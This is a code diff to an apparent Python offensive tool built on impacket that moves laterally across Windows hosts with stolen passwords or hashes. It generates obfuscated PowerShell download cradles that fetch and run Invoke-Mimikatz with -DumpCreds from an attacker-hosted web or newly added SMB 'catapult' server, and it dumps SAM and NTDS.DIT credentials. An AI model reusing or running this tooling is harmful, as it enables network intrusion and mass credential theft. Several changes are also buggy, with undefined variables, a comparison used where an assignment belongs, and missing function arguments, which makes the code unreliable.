@@ -43,9 +43,8 @@ try:
 except:
     sys.exit("[!] Install the wmi_client_wrapper library: pip install wmi_client_wrapper && apt-get install wmi-client")
 try:
-    import psexec, smbexec, atexec, netview
-    import wmiexec as wmiexec
-    import secretsdump
+    import psexec, smbexec, atexec, netview, wmiexec, secretsdump
+    from impacket import smbserver, version
 except Exception as e:
     print("[!] The following error occured %s") % (e)
     sys.exit("[!] Install the necessary impacket libraries and move this script to the examples directory within it")
@@ -144,7 +143,7 @@ class NetviewDetails:
 
 
 class Obfiscator:
-    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, dst_ip="", dst_port=""):
+    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, delivery, dst_ip="", dst_port=""):
         self.src_ip = src_ip
         self.dst_ip = dst_ip
         self.dst_port = dst_port
@@ -157,6 +156,7 @@ class Obfiscator:
         self.group = group
         self.command = ""
         self.unprotected_command = ""
+        self.delivery = delivery
         try:
             self.run()
         except Exception, e:
@@ -170,9 +170,6 @@ class Obfiscator:
         elif "download" in self.execution:
             # Direct downloader
             self.downloader()
-        elif "psexec" in self.execution:
-            # Direct invoker via psexec
-            self.invoker_psexec()
         elif "executor" in self.execution:
             # Direct PowerShell execution
             self.executor()
@@ -205,7 +202,7 @@ class Obfiscator:
 
     def executor(self):
         # Invoke a PowerShell Script Directly
-        if "-DumpCreds" not in self.argument:
+        if self.argument:
             text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         else:
             text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
@@ -282,10 +279,27 @@ def hash_test(LM, NTLM, pwd):
     pwd = ""
     return(LM, NTLM, pwd, hash)
 
+def delivery_server(port, working_dir, delivery_method):
+    if delivery_method == "web":
+        sub_proc = http_server(port, working_dir)
+    if delivery_method == "smb":
+        sub_proc == smb_server(working_dir)
+    return sub_proc
+
 def http_server(port, working_dir):
     null = open('/dev/null', 'w')
     sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
     #time.sleep(1)
+    return sub_proc
+
+def smb_server(working_dir):
+    note = ''
+    smb_srv = smbserver.SimpleSMBServer()
+    smb_srv.addShare(options.shareName.upper(), working_dir, note)
+    smb_srv.setSMB2Support(False)
+    smb_srv.setSMBChallenge('')
+    smb_srv.setLogFile('')
+    sub_proc = subprocess.Popen([smb_srv.start()])
     return sub_proc
 
 def wmi_test(usr, pwd, dom, dst):
@@ -305,11 +319,11 @@ def main():
     # If script is executed at the CLI
     usage = '''
 Find Logged In Users
-    %(prog)s [-i IP] [--dom Domain] [--usr Administrator] [--pwd Password1] --scout
+    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] --scout
 Command Shell:
-    %(prog)s [-i IP] [--usr Administrator] [--pwd Password1] [-t target] --smbexec -q -v -vv -vvv
+    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] [-t target] --smbexec -q -v -vv -vvv
 Attack Directly:
-    %(prog)s [-i IP] [--usr Administrator] [--pwd Password1] [-t target] --wmiexec --invoker -x /root/Invoke-Mimikatz.ps1
+    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] [-t target] --wmiexec --invoker
 Create Pasteable Double Encoded Script:
     %(prog)s --invoker -q -v -vv -vvv
 '''
@@ -317,20 +331,20 @@ Create Pasteable Double Encoded Script:
     group1 = parser.add_argument_group('Method')
     group2 = parser.add_argument_group('Attack')
     group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --secrets-dump')
-    iex_options = parser.add_argument_group('PowerShell IEX Options')
+    iex_options = parser.add_argument_group('Payload options to tell ranger where to source the attack information')
     remote_attack = parser.add_argument_group('Remote Target Options')
     generator = parser.add_argument_group('Filename for randimization of script')
     obfiscation = parser.add_argument_group('Tools to obfiscate the execution of scripts')
     method = group1.add_mutually_exclusive_group()
     attack = group2.add_mutually_exclusive_group()
     sam_dump_options = group3.add_mutually_exclusive_group()
-    iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Set the IP address of the Mimkatz server, defaults to eth0 IP")
-    iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
+    iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Sets the IP address your attacks will come from defaults to eth0 IP")
+    iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Sets the interface your attacks will come from if you do not use the default, default eth0")
     iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    iex_options.add_argument("-x", action="store", dest="payload", default="Invoke-Mimikatz.ps1", help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
-    iex_options.add_argument("-a", action="store", dest="mim_arg", default="-DumpCreds", help="Allows you to change the argument name if you are not using the Mimikatz script, defaults to DumpCreds")
-    iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function or cmdlet name if not using Invoke-Mimikatz, defaults to Invoke-Mimikatz")
-    attack.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
+    iex_options.add_argument("-x", action="store", dest="payload", default=None, help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
+    iex_options.add_argument("-a", action="store", dest="mim_arg", default=None, help="Allows you to set the argument")
+    iex_options.add_argument("-f", action="store", dest="mim_func", default=None, help="Allows you to set the function or cmdlet name")
+    attack.add_argument("--invoker", action="store_true", dest="invoker", help="Executes Mimikatz-Invoker against target systtems")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
     attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
     attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
@@ -360,6 +374,7 @@ Create Pasteable Double Encoded Script:
     sam_dump_options.add_argument("--sam", action="store", help="The SAM hive to parse")
     sam_dump_options.add_argument("--ntds", action="store", help="The NTDS.DIT file to parse")
     obfiscation.add_argument("--encoder", action="store_true", help="Set to encode the commands that are being executed")
+    obfiscation.add_argument("--delivery", action="store", dest=delivery, choices={"web","smb"}, default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
     parser.add_argument("-l", "--logfile", action="store", dest="log", default="results.log", type=str, help="The log file to output the results")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
@@ -374,6 +389,7 @@ Create Pasteable Double Encoded Script:
     # Set Constructors
     verbose = args.verbose             # Verbosity level
     src_port = args.src_port           # Port to source the Mimikatz script on
+    delivery = args.delivery
     log = args.log
     if ".log" not in log:
         log = log + ".log"
@@ -444,10 +460,17 @@ Create Pasteable Double Encoded Script:
     logger_obj.setLevel(level)
 
     # Get details for catapult server
-    cwd = str(os.path.dirname(payload))
-    if "/" not in cwd:
-        cwd = str(os.getcwd())
-    payload = os.path.basename(payload)
+    if payload != None:
+        cwd = str(os.path.dirname(payload))
+        if "/" not in cwd:
+            cwd = str(os.getcwd())
+        payload = os.path.basename(payload)
+    elif delivery == web:
+        cwd = "/opt/ranger/web"
+    elif deliver == smb:
+        cwd = "/opt/ranger/smb"
+        src_port = 445
+
     if aes != None:
         kerberos = True
     payload = ''.join(payload)
@@ -550,25 +573,29 @@ Create Pasteable Double Encoded Script:
 
     if invoker:
         execution = "invoker"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
+        if mim_func == None:
+            mim_func = "Invoke-Mimikatz"
+        if mim_arg == None:
+            mim_arg = "-DumpCreds"
+        if payload == None:
+            payload = "im.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
         command, unprotected_command = x.return_command()
     elif executor:
-        if "Invoke-Mimikatz.ps1" in payload or "Invoke-Mimikatz" in mim_func:
+        if None in payload or None in mim_func:
             sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
         execution = "executor"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
         command, unprotected_command = x.return_command()
     elif downloader:
+        if delivery == "smb":
+            sys.exit("[!] The Metasploit web_delivery module only works through web server based attacks")
         execution = "downloader"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
-        command, unprotected_command = x.return_command()
-    elif psexec_cmd and invoker:
-        execution = "psexec"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
         command, unprotected_command = x.return_command()
     elif group:
         execution = "group"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery)
         command, unprotected_command = x.return_command()
     elif netview_cmd:
         attacks = True
@@ -600,8 +627,8 @@ Create Pasteable Double Encoded Script:
     if psexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = http_server(src_port, cwd)
-                print("[*] Starting web server on port %s in %s" ) % (str(src_port), str(cwd))
+                srv = delivery_server(src_port, cwd)
+                print("[*] Starting %s server on port %s in %s" ) % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -610,12 +637,12 @@ Create Pasteable Double Encoded Script:
             attack.run(dst)
             if attacks:
                 srv.terminate()
-                print("[*] Shutting down the catapult web server")
+                print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif wmiexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = http_server(src_port, cwd)
-                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
+                srv = delivery_server(src_port, cwd)
+                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
                 else:
@@ -639,7 +666,7 @@ Create Pasteable Double Encoded Script:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             if attacks:
                 srv.terminate()
-                print("[*] Shutting down the catapult web server")
+                print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif netview_cmd:
         for dst in final_targets:
             if methods:
@@ -654,8 +681,8 @@ Create Pasteable Double Encoded Script:
     elif smbexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = http_server(src_port, cwd)
-                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
+                srv = delivery_server(src_port, cwd)
+                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -664,12 +691,12 @@ Create Pasteable Double Encoded Script:
             attack.run(dst)
             if attacks:
                 srv.terminate()
-                print("[*] Shutting down the catapult web server")
+                print("[*] Shutting down the catapult %s server") % (str(delivery))
     elif atexec_cmd:
         for dst in final_targets:
             if attacks:
-                srv = http_server(src_port, cwd)
-                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
+                srv = delivery_server(src_port, cwd)
+                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
@@ -679,8 +706,8 @@ Create Pasteable Double Encoded Script:
             attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
             attack.play(dst)
             if attacks and not encoder:
-                srv = http_server(src_port, cwd)
-                print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
+                srv = delivery_server(src_port, cwd)
+                print("[*] Starting %s server on port %s in %s") % (str(delivery), str(src_port), str(cwd))
                 if hash:
                     print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
                 else:
@@ -691,7 +718,7 @@ Create Pasteable Double Encoded Script:
                 attack.play(dst)
             if attacks:
                 srv.terminate()
-                print("[*] Shutting down the catapult web server")
+                print("[*] Shutting down the catapult %s server") % (delivery)
     elif sam_dump:
         for dst in final_targets:
             if hash:
